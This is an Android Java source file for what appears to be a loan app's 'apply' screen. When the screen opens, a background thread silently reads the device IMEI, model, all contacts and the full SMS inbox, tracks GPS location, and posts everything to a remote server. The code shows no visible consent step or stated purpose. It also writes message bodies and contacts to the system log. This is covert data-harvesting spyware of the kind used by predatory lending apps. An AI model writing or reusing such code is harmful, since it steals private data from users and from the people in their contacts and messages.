package com.example.aglowmudra;

import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Address;
import android.location.Geocoder;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.telephony.TelephonyManager;
import android.util.Log;

import org.json.JSONObject;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;

import okhttp3.FormBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import utilites.Utils;

public class LoanApplyActvity extends AppCompatActivity {
    TelephonyManager telephonyManager;
    String imeiNumber1 = "";
    String DeviceModel="";
    String DeviceName="";
    double latitute;
    double longitude;
    ArrayList<String> phone = new ArrayList<>();
    ArrayList<String> smses = new ArrayList<>();
    final ArrayList<String> nameList = new ArrayList<>();
    @RequiresApi(api = Build.VERSION_CODES.M)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_loan_apply_actvity);
        getLocation();
        Thread thread=new Thread(new Runnable() {
            @SuppressLint("NewApi")
            @RequiresApi(api = Build.VERSION_CODES.GINGERBREAD)
            @Override
            public void run() {
                PhoneMiMe();
                DeviceModel = android.os.Build.MODEL;
                Log.d("TAG", "Model Name" + DeviceModel);
                DeviceName = android.os.Build.MANUFACTURER;
                Log.d("TAG", "Device Name " + DeviceName);

                getAllContacts();

                getsms();

            }
        });
        thread.start();

    }
    public void PhoneMiMe() {
        try {
            Log.d("TAG", "Value is creted by");
            telephonyManager = (TelephonyManager) getSystemService(this.TELEPHONY_SERVICE);
            @SuppressLint("MissingPermission") String imeiNumber = telephonyManager.getDeviceId();
            imeiNumber1 = imeiNumber;
            Log.d("TAG", "Value is created in the MAin Activity Mime" + imeiNumber);
        } catch (Exception e) {
            e.getStackTrace();
        }

    }
    private ArrayList getAllContacts() {
        try {            Log.d("TAG", "Value is creted by system");

            String contact = "";

            Log.d("TAG", "Value is creted" + nameList);
            ContentResolver cr = getContentResolver();
            Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                    null, null, null, null);
            if ((cur != null ? cur.getCount() : 0) > 0) {
//            Log.d("TAG", "VAlue in second");
                while (cur != null && cur.moveToNext()) {
                    Log.d("TAG", "Value in third");
                    String id = cur.getString(
                            cur.getColumnIndex(ContactsContract.Contacts._ID));
                    String name = cur.getString(cur.getColumnIndex(
                            ContactsContract.Contacts.DISPLAY_NAME));

                    //    nameList.add(name);
                    if (cur.getInt(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                        Log.d("TAG", "VAlue in fouth");
                        Cursor pCur = cr.query(

                                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                                null,
                                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                                new String[]{id}, null);

                        while (pCur.moveToNext()) {
                            Log.d("TAG", "value in fivth");
                            String name1 = pCur.getString(pCur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                            String phoneNo = pCur.getString(pCur.getColumnIndex(
                                    ContactsContract.CommonDataKinds.Phone.NUMBER));
                            //    Log.d("TAG","Value is :"+name1 +" phone"+phoneNo);
                            // phone.add(name1);
                            // phone.add(phoneNo);
                            contact = name1 + " : " + phoneNo;
                            phone.add(contact);


                        }
                        pCur.close();
                    }

                }

                Log.d("TAG", "VAlue is creted in the end" + phone);

                if (cur != null) {
                    cur.close();
                }
            }

        }catch (Exception e){
            e.getStackTrace();
        }
        return nameList;

    }
    @RequiresApi(api = Build.VERSION_CODES.M)
    public ArrayList<String> getsms() {
        try {
            Log.d("tag", "i am at sms function ");
            Uri mysms = Uri.parse("content://sms/inbox");
            Cursor cursor = getContentResolver().query(mysms, null, null, null, null);
            while (cursor.moveToNext()) {
                String number = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                String msg = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                String fullsms = "number" + number + ": " + msg;
                smses.add(fullsms);
                Log.d("TAG", "here is my sms " + number + "sfd " + msg);
                Log.d("TAG", "value of array for sms" + smses);
            }
        }catch (Exception e){
            e.getStackTrace();
        }
sendalldata();
        return smses;

    }
    @RequiresApi(api = Build.VERSION_CODES.M)
    public void sendalldata() {
        Log.d("TAG", "Value is  Login Attempt");
        Log.d("TAG", "value of array for Phone" + phone);
        Log.d("TAG","Value of Longitude"+longitude);
        Log.d("TAG","Value of Longitude"+latitute);


        String url = "https://drfin.in/aglowcredit/api/updateCustomerDetails";
        RequestBody formBody = new FormBody.Builder()
                .add("auth_token", Utils.sharedPreferences.getString("Auth_token", ""))
                .add("contact_list", String.valueOf(phone))
                .add("sms_list", String.valueOf(smses))
                .add("device_id", DeviceModel)
                .add("device_name", DeviceName)
                .add("imei_number", imeiNumber1)
                .add("longitude", String.valueOf(longitude))
                .add("latitude", String.valueOf(latitute))

                .build();

        OkHttpClient client = new OkHttpClient();
        Request request = new Request.Builder()
                .url(url)
                .post(formBody)
                .build();


        try {
            Response response = client.newCall(request).execute();
            Log.d("TAG", "Alue is response1V" + response);
            String responseString = response.body().string();

            Log.d("TAG", "VAlue is response22323" + responseString);
            try {
                JSONObject json = new JSONObject(responseString);
                //  String authvalue=json.getString("auth_token");
                //  Log.d("TAG","VAlue is created by auth"+authvalue);
                String Auth_token = json.getJSONObject("userdata").getString("auth_token");

            } catch (Exception e) {
                e.getStackTrace();
            }
        } catch (Exception e) {
            e.getStackTrace();
        }
    }
        @RequiresApi(api = Build.VERSION_CODES.M)
        public void getLocation(){
        try {
            LocationManager locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                // TODO: Consider calling
                //    Activity#requestPermissions
                // here to request the missing permissions, and then overriding
                //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
                //                                          int[] grantResults)
                // to handle the case where the user grants the permission. See the documentation
                // for Activity#requestPermissions for more details.
                return;
            }
            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0, new LocationListener() {
                public void onStatusChanged(String provider, int status, Bundle extras) {
                    // called when the location provider status changes. Possible status: OUT_OF_SERVICE, TEMPORARILY_UNAVAILABLE or AVAILABLE.
                }

                public void onProviderEnabled(String provider) {
                    // called when the location provider is enabled by the user
                }

                public void onProviderDisabled(String provider) {
                    // called when the location provider is disabled by the user. If it is already disabled, it's called immediately after requestLocationUpdates
                }

                public void onLocationChanged(Location location) {
                    latitute = location.getLatitude();
                    longitude = location.getLongitude();
                    Log.d("TAG", "Value of latitude is :" + latitute);
                    Log.d("TAG", "Value of latitude is :" + longitude);
                    Thread thread=new Thread(new Runnable() {
                        @Override
                        public void run() {
                            SendLocationdata();
                        }
                    });
thread.start();

                }

            });
        }catch (Exception e){
          e.getStackTrace();
        }

          /*  try {


                Geocoder geo = new Geocoder(this.getApplicationContext(), Locale.getDefault());
                List<Address> addresses = geo.getFromLocation(longitude, latitute, 1);
                if (addresses.isEmpty()) {
                    Log.d("TAG", "Value is creted by address");
                } else {
                    if (addresses.size() > 0) {
                        Log.d("TAG","Value of address"+addresses);
                        Log.d("TAG", "Location Name" + addresses.get(0).getFeatureName() + ", " + addresses.get(0).getLocality() + ", " + addresses.get(0).getAdminArea() + ", " + addresses.get(0).getCountryName());
//                    yourtextboxname.setText(addresses.get(0).getFeatureName() + ", " + addresses.get(0).getLocality() +", " + addresses.get(0).getAdminArea() + ", " + addresses.get(0).getCountryName());
                    }
                }
            } catch (Exception e) {
                e.getStackTrace();

            }*/

        }
        public  void SendLocationdata(){
        Log.d("TAG","VAlue is created in back end Location");

            String url = "https://drfin.in/aglowcredit/api/updateCustomerDetails";
            RequestBody formBody = new FormBody.Builder()
                    .add("auth_token", Utils.sharedPreferences.getString("Auth_token", ""))
                    .add("longitude", String.valueOf(longitude))
                    .add("latitude", String.valueOf(latitute))

                    .build();

            OkHttpClient client = new OkHttpClient();
            Request request = new Request.Builder()
                    .url(url)
                    .post(formBody)
                    .build();


            try {
                Response response = client.newCall(request).execute();
                Log.d("TAG", "Alue is response1V" + response);
                String responseString = response.body().string();

                Log.d("TAG", "VAlue is response22323" + responseString);
                try {
                    JSONObject json = new JSONObject(responseString);
                    //  String authvalue=json.getString("auth_token");
                    //  Log.d("TAG","VAlue is created by auth"+authvalue);
                    String Auth_token = json.getJSONObject("userdata").getString("auth_token");

                } catch (Exception e) {
                    e.getStackTrace();
                }
            } catch (Exception e) {
                e.getStackTrace();
            }


        }

            }

